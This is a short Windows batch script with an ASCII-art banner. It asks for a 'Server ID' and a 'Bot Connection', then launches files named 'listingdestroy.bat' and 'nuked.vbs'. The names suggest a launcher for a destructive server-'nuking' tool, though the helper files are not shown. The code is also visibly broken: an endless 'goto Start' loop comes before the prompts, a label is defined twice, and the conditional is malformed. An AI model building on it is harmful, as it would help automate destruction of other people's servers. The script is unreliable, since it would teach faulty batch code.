chcp 65001
mode 70,17
color 4
@echo off
:Start
cls
goto Start
:Start

title Signed in As (%COMPUTERNAME%)
echo.
echo              █████   ██       ██     ████       ██████
echo             ██       ████   ████    ██  ██     ███
echo              ███▄    ██ ██ ██ ██   ████████   ███
echo                  ██  ██   ██  ██   ██    ██    ███
echo              █████   ██       ██   ██    ██     █████▄
echo.
set input=
set /p input= Server ID:
set /p input= Bot Connection:
if %input%==000000 goto A if not goto Y
exit

:A
start listingdestroy.bat 
goto :B
exit

:B 
call nuked.vbs
exit
